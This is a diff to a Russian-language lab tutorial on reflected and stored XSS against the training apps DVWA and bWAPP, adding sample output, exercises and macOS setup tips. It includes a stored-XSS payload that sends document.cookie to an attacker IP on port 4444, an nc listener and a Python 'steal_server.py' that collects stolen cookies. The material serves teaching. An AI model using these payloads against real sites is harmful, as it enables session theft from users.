@@ -57,7 +57,7 @@
 
 ### Настройка DVWA
 
-1. Откройте http://localhost
+1. Откройте http://192.168.0.x (IP вашей VM с DVWA)
 2. Установите уровень безопасности **Low** (DVWA Security)
 3. Перейдите в **XSS (Reflected)**
 
@@ -108,13 +108,22 @@ Message: <script>alert('Stored XSS!')</script>
 ```
 Message: <script>
   var img = new Image();
-  img.src = 'http://localhost:4444/steal?c=' + document.cookie;
+  img.src = 'http://192.168.0.123:4444/steal?c=' + document.cookie;
 </script>
 ```
 
-Для приема украденных cookie запустите слушатель:
+Для приема украденных cookie запустите слушатель (замените IP на ваш в локальной сети):
 ```bash
 nc -lvnp 4444
+```
+
+Пример вывода при краже cookie:
+```
+listening on [any] 4444 ...
+connect to [192.168.0.123] from (UNKNOWN) [172.17.0.2] 54321
+GET /steal?c=PHPSESSID=abc123def456;%20security=low HTTP/1.1
+Host: 192.168.0.123:4444
+User-Agent: Mozilla/5.0...
 ```
 
 **Шаг 3: Невидимый iframe**
@@ -128,7 +137,81 @@ Message: <iframe src="javascript:alert('XSS')" style="display:none"></iframe>
 2. **Скриншот 2**: Stored XSS — сообщение с скриптом в гостевой книге
 3. **Скриншот 3**: Stored XSS — alert срабатывает при загрузке страницы
 
+### Примеры вывода
+
+**Reflected XSS — успешный пейлоад:**
+```html
+<!-- Исходный код ответа после ввода <script>alert('XSS')</script> -->
+<pre>Hello <script>alert('XSS')</script></pre>
+<div class="body_padded">
+  <p>Hello <script>alert('XSS')</script></p>
+</div>
+```
+
+**Stored XSS — кража cookie (запрос на сервер атакующего):**
+```
+GET /steal?c=PHPSESSID%3Dabc123def456%3B%20security%3Dlow HTTP/1.1
+Host: 192.168.0.123:4444
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+Referer: http://192.168.0.x/vulnerabilities/xss_s/
+```
+
+**Ответ сервера при XSS в bWAPP:**
+```html
+<div id="main">
+  <p>Welcome <script>alert(1)</script>!</p>
+</div>
+```
+
+### Частые ошибки
+
+1. **Пытаться выполнить XSS в адресной строке без параметра** — нужен параметр, который попадает в DOM
+2. **Забыть про фильтры** — на уровне Medium `<script>` часто фильтруется, используйте `<img onerror>`
+3. **Stored XSS не срабатывает** — возможно, нужно обновить страницу или проверить, сохранилось ли сообщение
+4. **HttpOnly cookie** — если cookie имеет флаг HttpOnly, `document.cookie` её не вернет
+
+### Вопросы на понимание
+
+1. В чем разница между Reflected и Stored XSS с точки зрения жертвы?
+2. Почему Stored XSS опаснее Reflected?
+3. Что делает флаг HttpOnly и как он защищает от XSS?
+4. Почему `<img src=x onerror=alert(1)>` работает, когда `<script>` заблокирован?
+
+### Адаптация под macOS (M2)
+
+```bash
+# Создание простого сервера для приема украденных cookie (Python3 на macOS)
+cat > steal_server.py << 'EOF'
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f"[+] Stolen: {self.path}")
+        self.send_response(200)
+        self.end_headers()
+        
+    def log_message(self, format, *args):
+        pass  # Отключаем стандартные логи
+
+print("[*] Listening on 0.0.0.0:4444")
+HTTPServer(('0.0.0.0', 4444), Handler).serve_forever()
+EOF
+
+python3 steal_server.py
+```
+
 ---
+
+
+## Адаптация под macOS (M2, 8GB)
+
+- Для установки инструментов используйте Homebrew: `brew install <tool>`
+- На MacBook Air M2 (8GB) запускайте VM с памятью не более 3-4GB
+- Используйте UTM вместо VirtualBox (лучшая поддержка ARM)
+- Docker работает нативно на M2: `docker pull <image>`
+- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
+- Для Python используйте `pip3 install` вместо `pip install`
+
 
 ## Задачи для самостоятельного выполнения
 
@@ -157,6 +240,6 @@ Message: <iframe src="javascript:alert('XSS')" style="display:none"></iframe>
    
    Какой пейлоад сработал? Почему?
 
-4. **XSS в bWAPP**: Откройте bWAPP (http://localhost), выберите уязвимость **XSS - Reflected (GET)**, уровень low. Выполните XSS с пейлоадом `<script>alert('bWAPP XSS')</script>`. Сделайте скриншот результата.
+4. **XSS в bWAPP**: Откройте bWAPP (http://192.168.0.x), выберите уязвимость **XSS - Reflected (GET)**, уровень low. Выполните XSS с пейлоадом `<script>alert('bWAPP XSS')</script>`. Сделайте скриншот результата.
 
 5. **Cookie с флагом HttpOnly**: В DVWA (уровень Low) проверьте, есть ли у cookie флаг HttpOnly. Откройте DevTools → Application → Cookies. Если cookie доступна через `document.cookie`, значит HttpOnly отключен. Опишите, как это влияет на XSS-атаку.
